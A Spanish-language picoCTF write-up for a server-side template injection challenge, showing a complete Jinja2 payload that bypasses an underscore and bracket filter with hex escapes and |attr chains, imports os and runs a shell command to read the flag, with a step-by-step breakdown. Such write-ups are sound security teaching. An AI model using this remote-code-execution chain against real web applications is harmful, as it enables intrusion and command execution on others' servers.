# Descripción

I've improved my announcement website! Now I'm using an even stronger filter to remove dangerous characters. I bet it's unhackable this time.

# Solución

Este reto era una versión más difícil del anterior de **Inyección de Plantillas del Lado del Servidor (SSTI)**. El filtro era mucho más estricto y bloqueaba directamente caracteres esenciales como el guion bajo (`_`) y los corchetes (`[]`), haciendo inútiles los métodos de bypass más comunes.

La clave fue utilizar **secuencias de escape hexadecimales** dentro de los strings para construir los nombres de atributos prohibidos, como `__globals__`. El carácter `_` se puede representar como `\x5f`.

Inyecté el siguiente payload completo en el formulario. Este payload navega por los objetos de la aplicación, importa el módulo `os` del sistema y lo usa para ejecutar `cat flag.txt`.

Django

```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag.txt')|attr('read')()}}
```

El servidor procesó el payload, ejecutó el comando y devolvió la bandera como resultado.

**Solución:** `picoCTF{sst1_f1lt3r_byp4ss_e39c23ee}`

# Notas adicionales

Este payload es una obra de arte del bypass de filtros y demuestra varias técnicas avanzadas.

### Bypass con Escapes Hexadecimales (`\x5f`)

Este es el truco principal. Cuando un filtro bloquea un carácter específico (como `_`), a veces es posible evadirlo representando ese carácter con su código hexadecimal (o en otros formatos de escape).

- El código ASCII para el guion bajo (`_`) es `5f` en hexadecimal.
    
- La cadena `'\x5f\x5fglobals\x5f\x5f'` es procesada por el servidor, que la interpreta como `__globals__`, bypassando así el filtro que buscaba el carácter `_` literal.
    

### Acceso a Diccionarios con `__getitem__`

Cuando los corchetes (`[]`) están filtrados, no se puede acceder a los elementos de un diccionario con la sintaxis normal (ej. `mi_diccionario['clave']`).

- La alternativa es usar el método interno `__getitem__`.
    
- La expresión `|attr('__getitem__')('__builtins__')` es funcionalmente equivalente a `['__builtins__']`, permitiendo el acceso a la clave del diccionario sin usar corchetes.
    

### Importación de Módulos con `__import__`

Para ejecutar comandos del sistema, se necesita acceso a módulos como `os` o `subprocess`.

- La función `__import__` es un "builtin" de Python que permite importar módulos de forma dinámica usando su nombre como un string.
    
- El payload accede a esta función a través de la cadena `...builtins...|attr('__getitem__')('__import__')` y luego la llama con `('os')` para importar el módulo `os`.
    

### Cadena Completa del Exploit

1. `request|attr('application')`: Se parte del objeto global `request` para llegar a la aplicación principal.
    
2. `|attr('\x5f\x5fglobals\x5f\x5f')`: Se accede a las variables globales (`__globals__`).
    
3. `...|attr('__getitem__')('\x5f\x5fbuiltins\x5f\x5f')`: Se accede a los "builtins" de Python.
    
4. `...|attr('__getitem__')('\x5f\x5fimport\x5f\x5f')`: Se obtiene la función `__import__`.
    
5. `('os')`: Se importa el módulo `os`.
    
6. `|attr('popen')('cat flag.txt')`: Se usa `os.popen` para ejecutar el comando `cat flag.txt`.
    
7. `|attr('read')()`: Se lee y muestra la salida del comando, que es la bandera.
    

# Referencias

[https://onsecurity.io/article/server-side-template-injection-with-jinja2/](https://onsecurity.io/article/server-side-template-injection-with-jinja2/)